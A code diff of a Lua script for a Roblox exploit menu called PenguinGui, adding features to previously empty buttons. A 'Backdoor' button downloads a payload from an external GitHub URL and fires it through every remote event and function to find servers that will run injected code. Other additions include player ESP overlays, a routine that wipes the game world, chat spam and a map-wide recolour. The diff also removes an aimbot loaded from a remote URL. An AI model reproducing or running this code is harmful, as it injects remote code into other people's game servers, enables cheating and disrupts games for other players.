@@ -680,6 +680,8 @@ button.MouseButton1Down:connect(function()
 	title.BackgroundTransparency = 0.5
 	local close = createBtn(UDim2.new(0,250,0,57),UDim2.new(0,0,0.905,0),48,"Close",mainframe)
 	local delete = createBtn(UDim2.new(0,147,0,50),UDim2.new(0.632,0,0,0),28,"Delete",mainframe)
+	local togleAnchor = createBtn(UDim2.new(0,147,0,50),UDim2.new(0.632,0,0,53),28,"Togle Anchor",mainframe)
+	local togleTrans = createBtn(UDim2.new(0,147,0,50),UDim2.new(0.632,0,0,106),22,"Togle Transparency",mainframe)
 	
 	close.MouseButton1Down:Connect(function()
 		gui:Remove()
@@ -754,6 +756,22 @@ button.MouseButton1Down:connect(function()
 		end
 	end)
 	
+	togleAnchor.MouseButton1Down:Connect(function()
+		if selectedpart ~= nil then
+			selectedpart.Anchored = not selectedpart.Anchored
+		end
+	end)
+	
+	togleTrans.MouseButton1Down:Connect(function()
+		if selectedpart ~= nil then
+			if selectedpart.Transparency >= 1 then
+				selectedpart.Transparency = 0
+			else
+				selectedpart.Transparency = selectedpart.Transparency + 0.1
+			end
+		end
+	end)
+	
 	local dragToggle = nil
 	local dragSpeed = 0.25
 	local dragStart = nil
@@ -789,16 +807,179 @@ button.Parent = acg
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Players Info"
 button.Position = UDim2.new(0.5,0,0,33)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Players Info"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	local selectedPlr = nil
+	local enebled = true
+	
+	local gui = Instance.new("ScreenGui")
+	gui.Parent = game.Players.LocalPlayer.PlayerGui
+	gui.Name = "Players Info"
+	local mainframe = Instance.new("Frame")
+	mainframe.Name = "mainframe"
+	mainframe.Parent = gui
+	mainframe.Position = UDim2.new(0.39,0,0.299,0)
+	mainframe.Size = UDim2.new(0.45,0,0.45,0)
+	mainframe.BackgroundTransparency = 0.5
+	mainframe.BackgroundColor3 = blak
+	mainframe.BorderColor3 = blue
+	mainframe.BorderSizePixel = 3
+	local title = Instance.new("TextLabel")
+	title.Name = "Title"
+	title.Parent = mainframe
+	title.Position = UDim2.new(0,0,0,0)
+	title.Size = UDim2.new(0,200,0,50)
+	title.Text = "Players Info"
+	title.BackgroundTransparency = 0.5
+	title.BackgroundColor3 = blak
+	title.Font = tef
+	title.FontSize = "Size32"
+	title.TextColor3 = whit
+	title.BorderColor3 = blue
+	title.BorderSizePixel = 3
+	local NameLabel = Instance.new("TextLabel")
+	NameLabel.BorderColor3 = blue
+	NameLabel.BorderSizePixel = 3
+	NameLabel.Name = "NameLabel"
+	NameLabel.Parent = mainframe
+	NameLabel.Position = UDim2.new(0.446,0,-0.004,0)
+	NameLabel.Size = UDim2.new(0,252,0,46)
+	NameLabel.Text = "Name"
+	NameLabel.BackgroundTransparency = 0.5
+	NameLabel.BackgroundColor3 = blak
+	NameLabel.Font = tef
+	NameLabel.FontSize = "Size28"
+	NameLabel.TextColor3 = whit
+	local Hplabel = Instance.new("TextLabel")
+	Hplabel.Name = "Hplabel"
+	Hplabel.Parent = mainframe
+	Hplabel.Position = UDim2.new(0.446,0,0.169,0)
+	Hplabel.Size = UDim2.new(0,252,0,46)
+	Hplabel.Text = "Health"
+	Hplabel.BackgroundTransparency = 0.5
+	Hplabel.BackgroundColor3 = blak
+	Hplabel.Font = tef
+	Hplabel.FontSize = "Size28"
+	Hplabel.TextColor3 = whit
+	Hplabel.BorderColor3 = blue
+	Hplabel.BorderSizePixel = 3
+	local walkspeedLabel = Instance.new("TextLabel")
+	walkspeedLabel.Name = "walkspeedLabel"
+	walkspeedLabel.Parent = mainframe
+	walkspeedLabel.Position = UDim2.new(0.446,0,0.342,0)
+	walkspeedLabel.Size = UDim2.new(0,252,0,46)
+	walkspeedLabel.Text = "WalkSpeed"
+	walkspeedLabel.BackgroundTransparency = 0.5
+	walkspeedLabel.BackgroundColor3 = blak
+	walkspeedLabel.Font = tef
+	walkspeedLabel.FontSize = "Size28"
+	walkspeedLabel.TextColor3 = whit
+	walkspeedLabel.BorderColor3 = blue
+	walkspeedLabel.BorderSizePixel = 3
+	local positionLabel = Instance.new("TextLabel")
+	positionLabel.Name = "positionLabel"
+	positionLabel.Parent = mainframe
+	positionLabel.Position = UDim2.new(0.446,0,0.319,53)
+	positionLabel.Size = UDim2.new(0,252,0,46)
+	positionLabel.Text = "Position"
+	positionLabel.BackgroundTransparency = 0.5
+	positionLabel.BackgroundColor3 = blak
+	positionLabel.Font = tef
+	positionLabel.FontSize = "Size14"
+	positionLabel.TextColor3 = whit
+	positionLabel.BorderColor3 = blue
+	positionLabel.BorderSizePixel = 3
+	local stateLabel = Instance.new("TextLabel")
+	stateLabel.Parent = mainframe
+	stateLabel.Position = UDim2.new(0.446,0,0.492,53)
+	stateLabel.Size = UDim2.new(0,252,0,46)
+	stateLabel.Text = "State"
+	stateLabel.BackgroundTransparency = 0.5
+	stateLabel.BackgroundColor3 = blak
+	stateLabel.Font = tef
+	stateLabel.FontSize = "Size18"
+	stateLabel.TextColor3 = whit
+	stateLabel.BorderColor3 = blue
+	stateLabel.BorderSizePixel = 3
+	local closeLabel = Instance.new("TextButton")
+	closeLabel.Name = "closeBtn"
+	closeLabel.Parent = mainframe
+	closeLabel.Position = UDim2.new(0.446,0,0.831,7)
+	closeLabel.Size = UDim2.new(0,252,0,40)
+	closeLabel.Text = "Close"
+	closeLabel.BackgroundTransparency = 0.5
+	closeLabel.BackgroundColor3 = blak
+	closeLabel.Font = tef
+	closeLabel.FontSize = "Size14"
+	closeLabel.TextColor3 = whit
+	closeLabel.BorderColor3 = blue
+	closeLabel.BorderSizePixel = 3
+	closeLabel.TextSize = 28
+	closeLabel.MouseButton1Down:connect(function()
+		enebled = false
+		gui:Destroy()
+	end)
+	local scroll = Instance.new("ScrollingFrame")
+	scroll.Name = "Scroll"
+	scroll.Parent = mainframe
+	scroll.Position = UDim2.new(-0.002,0,0.179,0)
+	scroll.Size = UDim2.new(0,200,0,225)
+	scroll.BackgroundTransparency = 0.5
+	scroll.Active = true
+	scroll.ScrollBarThickness = 10
+	scroll.CanvasSize = UDim2.new(0,0,10,0)
+	scroll.BackgroundColor3 = blak
+	scroll.BorderColor3 = blue
+	scroll.BorderSizePixel = 3
+	scroll.ScrollingDirection = "Y"
+	scroll.CanvasPosition = Vector2.new(0,0)
+	scroll.ScrollBarImageColor3 = whit
+	
+	function updateScroll()
+		scroll:ClearAllChildren()
+		
+		for i,v in pairs(game.Players:GetChildren()) do
+			local text = Instance.new("TextButton")
+			text.Name = v.Name
+			text.Parent = scroll
+			text.Position = UDim2.new(0,0,0,(#scroll:GetChildren() - 1) * 53)
+			text.Size = UDim2.new(1,0,0,50)
+			text.BackgroundColor3 = blak
+			text.BorderColor3 = blue
+			text.BorderSizePixel = 3
+			text.Text = v.Name
+			text.TextColor3 = whit
+			text.Font = tef
+			text.FontSize = "Size14"
+			text.MouseButton1Down:Connect(function()
+				local plr = game.Players:FindFirstChild(text.Name)
+				if plr ~= nil then
+					selectedPlr = plr
+				end
+			end)
+		end
+	end
+	
+	updateScroll()
+	
+	while enebled do
+		print(1)
+		wait(.001)
+		if selectedPlr ~= nil then
+			positionLabel.Text = "Position: "..selectedPlr.Character.HumanoidRootPart.Position.X..",\n"..selectedPlr.Character.HumanoidRootPart.Position.Y..",\n"..selectedPlr.Character.HumanoidRootPart.Position.Z
+			stateLabel.Text = "State: "..tostring(selectedPlr.Character.Humanoid:GetState())
+			walkspeedLabel.Text = "WalkSpeed: "..selectedPlr.Character.Humanoid.WalkSpeed
+			Hplabel.Text = "Health: "..selectedPlr.Character.Humanoid.Health.."/"..selectedPlr.Character.Humanoid.MaxHealth
+			NameLabel.Text = "Name: "..selectedPlr.Name
+		end
+	end
 end)
 local button = Instance.new("TextButton")
 button.Parent = acg
@@ -2171,16 +2352,77 @@ button.Parent = acg
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Backdoor"
 button.Position = UDim2.new(0.5,0,0,198)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "BackDoor"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
+	local des = game:GetDescendants()
+	local comand = game:HttpGet("https://raw.githubusercontent.com/gleb2803/tester/refs/heads/main/tester.py")
+	comand = string.gsub(comand,"/localplayer/",game.Players.LocalPlayer.Name)
+	
+	function notify(text)
+		game:GetService("StarterGui"):SetCore("SendNotification",{
+			Title = "PenguinGui",
+			Text = text, 
+			Icon = "rbxassetid://104745398169988"
+		})
+	end
 
+	function testParent(obj)
+		if obj.Parent.Name == "RobloxReplicatedStorage" then return false end
+		return true
+	end
+
+	function testRE(re)
+		re:FireServer(comand)
+		if game.Players.LocalPlayer.PlayerGui:WaitForChild("PenguinGui",0.1) then
+			return true
+		else
+			return false
+		end
+	end
+
+	function testRF(rf)
+		rf:InvokeServer(comand)
+		if game.Players.LocalPlayer.PlayerGui:WaitForChild("PenguinGui",0.1) then
+			return true
+		else
+			return false
+		end
+	end
+
+	function main()
+		for i,v in pairs(des) do
+			if v:IsA("RemoteEvent") and testParent(v) then
+				if testRE(v) then
+					notify("BackDoor Found")
+					cka:Destroy()
+					break
+				end
+			elseif v:IsA("RemoteFunction") and testParent(v) then
+				if testRF(v) then
+					notify("BackDoor Found")
+					cka:Destroy()
+					break
+				end
+			end
+		end
+
+		if game.Players.LocalPlayer.PlayerGui:WaitForChild("PenguinGui",2) == nil then
+			notify("BackDoor Not Found")
+		end
+	end
+
+	notify("Search BackDoor")
+
+	local success = pcall(main)
+
+	if not success then notify("Error") end -- Coded by glebmalish_2000 --
 end)
 local label = Instance.new("TextLabel")
 label.Parent = gt
@@ -2293,16 +2535,37 @@ button.Parent = gt
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Clone Tool"
 button.Position = UDim2.new(0.5,0,0,33)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Clone Tool"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	local tool = Instance.new("Tool",game.Players.LocalPlayer.Backpack)
+	tool.Name = "Clone"
+	tool.TextureId = "rbxasset://Textures/Clone.png"
+	tool.Grip = CFrame.new(0, 0, -1, -1, -1.50995803e-07, -6.60023616e-15, -0, -4.37113883e-08, 1, -1.50995803e-07, 1, 4.37113883e-08)
+	local handle = Instance.new("Part",tool)
+	handle.Name = "Handle"
+	handle.Size = Vector3.new(1,0.8,4)
+	handle.Anchored = false
+	local mesh = Instance.new("SpecialMesh",handle)
+	mesh.MeshId = "rbxasset://fonts/clonewand.mesh"
+	mesh.TextureId = "rbxasset://textures/CloneWandTexture.png"
+	local mouse = game.Players.LocalPlayer:GetMouse()
+	tool.Activated:Connect(function()
+		local target = mouse.Target
+		local clone = target:Clone()
+		clone.Parent = target.Parent
+		clone.Position = target.Position + Vector3.new(0, 2 + clone.Size.Y, 0)
+		clone.Anchored = false
+		clone.CanCollide = true
+		clone.Transparency = 0
+		clone:MakeJoints()
+	end)
 end)
 local button = Instance.new("TextButton")
 button.Parent = gt
@@ -2848,7 +3111,6 @@ button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
 	local Tele = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
 	Tele.RequiresHandle = false
-	Tele.RobloxLocked = true
 	Tele.Name = "TPTool"
 	Tele.ToolTip = "Teleport Tool"
 	Tele.Equipped:connect(function(Mouse)
@@ -2864,16 +3126,38 @@ button.Parent = gt
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Move tool"
 button.Position = UDim2.new(0.5,0,0,132)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Move tool"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	local tool = Instance.new("Tool", game.Players.LocalPlayer.Backpack)
+	tool.Name = "Move"
+	tool.TextureId = "rbxassetid://1048129653"
+	tool.Grip = CFrame.new(0, 0, 0, 1, 0, -0, -0, -4.37113883e-08, -1, 0, 1, -4.37113883e-08)
+	local handle = Instance.new("Part", tool)
+	handle.Name = "Handle"
+	handle.Size = Vector3.new(0.2,0.8,3)
+	local mesh = Instance.new("SpecialMesh", handle)
+	mesh.MeshId = "http://www.roblox.com/asset/?id=16884681"
+	mesh.TextureId = "http://www.roblox.com/asset/?id=16884673"
+	mesh.Offset = Vector3.new(0,0,1)
+	local mouse = game.Players.LocalPlayer:GetMouse()
+	local selected = nil
+	
+	tool.Activated:Connect(function()
+		selected = mouse.Target
+		local selectedbox = Instance.new("SelectionBox", selected)
+		selectedbox.Adornee = selected
+		selectedbox.Color3 = blue
+		mouse.Button1Up:Wait()
+		selectedbox:Destroy()
+		selected.CFrame = mouse.Hit
+	end)
 end)
 local button = Instance.new("TextButton")
 button.Parent = gt
@@ -4273,15 +4557,22 @@ button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Play  Animation"
+button.Text = "Play\nAnimation"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
+	local animval = game.Players.LocalPlayer:FindFirstChild("animationVal")
+	if animval == nil then
+		animval = Instance.new("ObjectValue",game.Players.LocalPlayer)
+		animval.Name = "animationVal"
+	end
+	
 	local id = frame.Settings.Page2["Animation"].Text
 	local animation = Instance.new("Animation",game.Players.LocalPlayer.Character)
 	animation.AnimationId = "http://www.roblox.com/asset/?id="..id -- Эмоция танца Roblox
-
+	animation.Name = "Animation"
 	local animationTrack = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(animation)
+	animval.Value = animationTrack
 	animationTrack:Play()
 end)
 local button = Instance.new("TextButton")
@@ -4289,32 +4580,49 @@ button.Parent = localp
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Stop Animation"
 button.Position = UDim2.new(0,0,0,165)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Stop\nAnimation"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	if game.Players.LocalPlayer:FindFirstChild("animationVal") ~= nil then
+		game.Players.LocalPlayer.animationVal.Value:Stop()
+		game.Players.LocalPlayer.animationVal:Destroy()
+	end
 end)
 local button = Instance.new("TextButton")
 button.Parent = localp
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Meme messages"
 button.Position = UDim2.new(0.5,0,0,165)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Meme\nmessages"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	local messeges = {
+		"lol",
+		"kek",
+		"lox",
+		"bebra",
+		"huh",
+		"UwU",
+		"Penguin Is Mr Beast :O",
+		"bobr curva",
+		"IDK what write",
+		"Poco 20 ultimate bomb edition"
+	}
+	while true do wait(1)
+		game.Chat:Chat(game.Players.LocalPlayer.Character.Head,messeges[math.random(1,#messeges)],Enum.ChatColor.Blue)
+	end
 end)
 local button = Instance.new("TextButton")
 button.Parent = localp
@@ -4461,13 +4769,13 @@ button.Parent = misc
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Restore Skybox"
+button.Name = "Restore\nSkybox"
 button.Position = UDim2.new(0,0,0,99)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Restore Skybox"
+button.Text = "Restore\nSkybox"
 button.TextColor3 = whit
 button.TextWrapped = true
 button.MouseButton1Down:connect(function()
@@ -4480,16 +4788,71 @@ button.Parent = misc
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Restore\nGame"
 button.Position = UDim2.new(0.5,0,0,99)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Restore\nGame"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	for i,v in pairs(game.Lighting:GetChildren()) do
+		v:Remove()
+	end
+	
+	for i,v in pairs(game.Teams:GetChildren()) do
+		v:Remove()
+	end
+	
+	local playersFolder = Instance.new("Folder",game.Workspace)
+	playersFolder.Name = "Players"
+	
+	for i,v in pairs(game.Workspace:GetDescendants()) do
+		if v.className == "Model" and game.Players:FindFirstChild(v.Name) ~= nil and v:FindFirstChild("Humanoid") ~= nil then
+			v.Parent = playersFolder
+		end
+	end
+	
+	for i,v in pairs(game.Workspace:GetChildren()) do
+		if v.Name ~= "Terrain" and v.Name ~= "Camera" and v ~= playersFolder then
+			v:Remove()
+		end
+	end
+	
+	local pt = Instance.new("Part")
+	pt.BrickColor = BrickColor.new("Silver")
+	pt.Anchored = true
+	pt.CanCollide = true
+	pt.BottomSurface = "Weld"
+	pt.Parent = workspace
+	pt.Name = (math.random(1,1000000))
+	pt.Size = Vector3.new(1000, 1, 1000)
+	pt.Color = Color3.new(0, 0.4, 0)
+	
+	if game["Run Service"]:IsServer() then
+		local house = game.InsertService:LoadAsset(76404164510571)
+		house.Parent = game.Workspace
+		house.Name = "House"
+		house:MoveTo(Vector3.new(-33.889, 22.8, 52.982))
+	end
+	
+	local spawns = Instance.new("SpawnLocation")
+	spawns.Position = Vector3.new(-33.889, 22.8, 52.982)
+	spawns.Parent = game.Workspace
+	spawns.Name = "SpawnLocation"
+	spawns.Anchored = true
+	for i,v in pairs(playersFolder:GetChildren()) do
+		v.Parent = game.Workspace
+		v:MoveTo(spawns.Position)
+	end
+	
+	playersFolder:Destroy()
+	
+	local notify = Instance.new("Message",game.Workspace)
+	notify.Text = "Game restored."
+	wait(2)
+	notify:Remove()
 end)
 local button = Instance.new("TextButton")
 button.Parent = misc
@@ -4876,32 +5239,32 @@ button.Parent = psd
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Epic Face"
 button.Position = UDim2.new(0,0,0,99)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Epic Face"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	frame.Settings.Page1["Decal Id"].Text = 56369539
 end)
 local button = Instance.new("TextButton")
 button.Parent = psd
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Troll Face"
 button.Position = UDim2.new(0.5,0,0,99)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Troll Face"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	frame.Settings.Page1["Decal Id"].Text = 7120897383
 end)
 local button = Instance.new("TextButton")
 button.Parent = psd
@@ -5091,32 +5454,77 @@ button.Parent = pgi
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Disco all"
 button.Position = UDim2.new(0,0,0,66)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Disco all"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-
+	local parts = {}
+	local basics = {Color3.new(255/255,0/255,0/255),Color3.new(255/255,85/255,0/255),Color3.new(218/255,218/255,0/255),Color3.new(0/255,190/255,0/255),Color3.new(0/255,85/255,255/255),Color3.new(0/255,0/255,127/255),Color3.new(170/255,0/255,255/255),Color3.new(0/255,204/255,204/255),Color3.new(255/255,85/255,127/255),Color3.new(0/255,0/255,0/255),Color3.new(255/255,255/255,255/255)}
+	for i,v in pairs(game:GetDescendants()) do
+		if v:IsA("BasePart") then
+			table.insert(parts,v)
+		end
+	end
+	
+	while true do
+		for i,v in pairs(parts) do
+			v.BrickColor = BrickColor.new(basics[math.random(1,#basics)])
+		end
+		wait(0.1)
+	end
 end)
 local button = Instance.new("TextButton")
 button.Parent = pgi
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "Empty"
+button.Name = "Get closest player"
 button.Position = UDim2.new(0.5,0,0,66)
 button.Size = UDim2.new(0.5,0,0,30)
 button.ZIndex = 2
 button.Font = tef
 button.FontSize = "Size14"
-button.Text = "Empty"
+button.Text = "Get closest player"
 button.TextColor3 = whit
+button.TextWrapped = true
 button.MouseButton1Down:connect(function()
-
+	local a = game.Players:GetChildren()
+	local b = {
+		Player = nil,
+		Distance = nil
+	}
+	for i,v in pairs(a) do
+		if v ~= game.Players.LocalPlayer then
+			if a.Distance == nil then
+				b.Player = v
+				b.Distance = v:DistanceFromCharacter(game.Players.LocalPlayer.Character.HumanoidRootPart.Position)
+			else
+				if v:DistanceFromCharacter(game.Players.LocalPlayer.Character.HumanoidRootPart.Position) < b.Distance then
+					b.Player = v
+					b.Distance = v.DistanceFromCharacter
+				end
+			end
+		end
+	end
+	
+	if b.Player == nil and b.Distance == nil then
+		local mes = Instance.new("Message")
+		mes.Parent = game.Players.LocalPlayer.PlayerGui
+		mes.Text = "No players found"
+		wait(1.5)
+		mes:Destroy()
+	else
+		local mes = Instance.new("Message")
+		mes.Parent = game.Players.LocalPlayer.PlayerGui
+		mes.Text = "The closest player is "..b.Player.Name.." and the distance is "..b.Distance
+		wait(1.5)
+		mes:Destroy()
+	end
 end)
 local button = Instance.new("TextButton")
 button.Parent = pgi
@@ -5391,123 +5799,55 @@ button.FontSize = "Size24"
 button.Text = "Off"
 button.TextColor3 = whit
 button.MouseButton1Down:connect(function()
-	local lplr = game.Players.LocalPlayer
-	local camera = game:GetService("Workspace").CurrentCamera
-	local CurrentCamera = workspace.CurrentCamera
-	local worldToViewportPoint = CurrentCamera.worldToViewportPoint
-
-	local HeadOff = Vector3.new(0, 0.5, 0)
-	local LegOff = Vector3.new(0, 3, 0)
+	local valfolder = game.Players.LocalPlayer:FindFirstChild("ESP")
+	if valfolder == nil then
+		valfolder = Instance.new("Folder")
+		valfolder.Name = "ESP"
+		valfolder.Parent = game.Players.LocalPlayer
+	end
 	
-	local function createBoxEsp(v)
-		local Box = Drawing.new("Square")
-		Box.Visible = false
-		Box.Color = v.TeamColor.Color
-		Box.Thickness = 3
-		Box.Transparency = 1
-		Box.Filled = false
-
-		local HealthBar = Drawing.new("Line")
-		HealthBar.Visible = false
-		HealthBar.Color = Color3.new(0, 1, 0)
-		HealthBar.Thickness = 2
-
-		local NameTag = Drawing.new("Text")
-		NameTag.Visible = false
-		NameTag.Color = Color3.new(1, 1, 1)
-		NameTag.Size = 9
-		NameTag.Center = true
-		NameTag.Outline = true
-		NameTag.OutlineColor = Color3.new(0, 0, 0)
-
-		local DistanceTag = Drawing.new("Text")
-		DistanceTag.Visible = false
-		DistanceTag.Color = Color3.new(1, 1, 1)
-		DistanceTag.Size = 9
-		DistanceTag.Center = true
-		DistanceTag.Outline = true
-		DistanceTag.OutlineColor = Color3.new(0, 0, 0)
-
-		local Tracer = Drawing.new("Line")
-		Tracer.Visible = false
-		Tracer.Color = v.TeamColor.Color
-		Tracer.Thickness = 2
-
-		local ESPevent = game:GetService("RunService").RenderStepped:Connect(function()
-			
-			if v.Character and v.Character:FindFirstChild("Humanoid") and v.Character:FindFirstChild("HumanoidRootPart") and v ~= lplr and v.Character.Humanoid.Health > 0 then
-				local Vector, onScreen = camera:worldToViewportPoint(v.Character.HumanoidRootPart.Position)
-
-				local RootPart = v.Character.HumanoidRootPart
-				local Head = v.Character.Head
-				local RootPosition, RootVisibility = worldToViewportPoint(CurrentCamera, RootPart.Position)
-				local HeadPosition = worldToViewportPoint(CurrentCamera, Head.Position + HeadOff)
-				local LegPosition = worldToViewportPoint(CurrentCamera, RootPart.Position - LegOff)
-
-				Box.Size = Vector2.new(1000 / RootPosition.Z, HeadPosition.Y - LegPosition.Y)
-				Box.Position = Vector2.new(RootPosition.X - Box.Size.X / 2, RootPosition.Y - Box.Size.Y / 2)
-
-				local health = v.Character.Humanoid.Health / v.Character.Humanoid.MaxHealth
-				HealthBar.From = Vector2.new(Box.Position.X + Box.Size.X + 5, Box.Position.Y + Box.Size.Y * (1 - health))
-				HealthBar.To = Vector2.new(Box.Position.X + Box.Size.X + 5, Box.Position.Y + Box.Size.Y)
-				HealthBar.Color = Color3.new(1 - health, health, 0)
-
-				NameTag.Position = Vector2.new(Box.Position.X + Box.Size.X / 2, Box.Position.Y - 20)
-				NameTag.Text = v.Name
-				NameTag.Visible = true
-
-				DistanceTag.Position = Vector2.new(Box.Position.X + Box.Size.X / 2, Box.Position.Y + Box.Size.Y)
-				DistanceTag.Text = tostring(math.floor((lplr.Character.HumanoidRootPart.Position - RootPart.Position).Magnitude)) .. "m"
-				DistanceTag.Visible = true
-
-				local lplrHead = lplr.Character:FindFirstChild("Head")
-				if lplrHead then
-					local lplrHeadViewport = camera:worldToViewportPoint(lplrHead.Position)
-
-					Tracer.From = Vector2.new(lplrHeadViewport.X, lplrHeadViewport.Y)
-					Tracer.To = Vector2.new(RootPosition.X, RootPosition.Y)
-				end
-
-				if onScreen then
-					Box.Visible = true
-					HealthBar.Visible = true
-					NameTag.Visible = true
-					DistanceTag.Visible = true
-					Tracer.Visible = true
-				else
-					Box.Visible = false
-					HealthBar.Visible = false
-					NameTag.Visible = false
-					DistanceTag.Visible = false
-					Tracer.Visible = false
-				end
-			else
-				Box.Visible = false
-				HealthBar.Visible = false
-				NameTag.Visible = false
-				DistanceTag.Visible = false
-				Tracer.Visible = false
-			end
-		end)
-		repeat
-			wait(0.01)
-		until button.Text == "Off"
-		ESPevent:Disconnect()
+	function createBilboard(root)
+		local billboard = Instance.new("BillboardGui")
+		billboard.Parent = root
+		billboard.Size = UDim2.new(0,200,0,50)
+		billboard.AlwaysOnTop = true
+		billboard.StudsOffset = Vector3.new(0,3,0)
+		local text = Instance.new("TextLabel")
+		text.Parent = billboard
+		text.Size = UDim2.new(1,0,1,0)
+		text.BackgroundTransparency = 1
+		text.Text = root.Name
+		text.TextColor3 = blue
+		text.TextStrokeTransparency = 0
+		text.TextStrokeColor3 = Color3.new(0,0,0)
+		text.TextSize = 12
+		local istval = Instance.new("ObjectValue",valfolder)
+		istval.Name = root.Name
+		istval.Value = billboard
+		local highlight = Instance.new("Highlight")
+		highlight.Parent = root
+		highlight.FillColor = blak
+		highlight.FillTransparency = 0.5
+		highlight.OutlineColor = blue
+		highlight.OutlineTransparency = 0
+		istval = Instance.new("ObjectValue",valfolder)
+		istval.Name = root.Name
+		istval.Value = highlight
 	end
 	
 	if button.Text == "Off" then
 		button.Text = "On"
-		
-		for i, v in pairs(game.Players:GetChildren()) do
-			createBoxEsp(v)
+		for i,v in pairs(game.Players:GetChildren()) do
+			if v.Character ~= nil then
+				createBilboard(v.Character)
+			end
 		end
-
-		game.Players.PlayerAdded:Connect(function(v)
-			createBoxEsp(v)
-		end)
 	else
 		button.Text = "Off"
-		Drawing.clear()
+		for i,v in valfolder:GetChildren() do
+			v.Value:Destroy()
+			v:Destroy()
+		end
 	end
 end)
 
@@ -5564,20 +5904,20 @@ label.Parent = pge1
 label.BackgroundColor3 = blak
 label.BorderColor3 = blue
 label.BorderSizePixel = 3
-label.Name = "AimBot"
+label.Name = "Floating Pad Label"
 label.Position = UDim2.new(0,0,0,132)
 label.Size = UDim2.new(1,0,0,30)
 label.ZIndex = 1
 label.Font = tef
 label.FontSize = "Size24"
-label.Text = "AimBot"
+label.Text = "Floating Pad"
 label.TextColor3 = whit
 local button = Instance.new("TextButton")
 button.Parent = pge1
 button.BackgroundColor3 = blak
 button.BorderColor3 = blue
 button.BorderSizePixel = 3
-button.Name = "AimBot Btn"
+button.Name = "Floating Pad Btn"
 button.Position = UDim2.new(0,0,0,165)
 button.Size = UDim2.new(1,0,0,30)
 button.ZIndex = 1
@@ -5585,21 +5925,30 @@ button.Font = tef
 button.FontSize = "Size24"
 button.Text = "Off"
 button.TextColor3 = whit
-local AimbotLIB = nil
-if not game["Run Service"]:IsRunMode() then
-	AimbotLIB = loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Aimbot-V3/main/src/Aimbot.lua"))()
-end
 button.MouseButton1Down:connect(function()
 	if button.Text == "Off" then
 		button.Text = "On"
-		if AimbotLIB ~= nil then
-			AimbotLIB.Load()
+		local name = game.Players.LocalPlayer.Name
+		local p = Instance.new("Part")
+		p.Name = "Floating Pad"
+		p.Parent = workspace
+		p.Locked = true
+		p.BrickColor = BrickColor.new("White")
+		p.BrickColor = BrickColor.new(104)
+		p.Size = Vector3.new(8, 1.2, 8)
+		p.Anchored = true
+		local m = Instance.new("CylinderMesh")
+		m.Scale = Vector3.new(1, 0.5, 1)
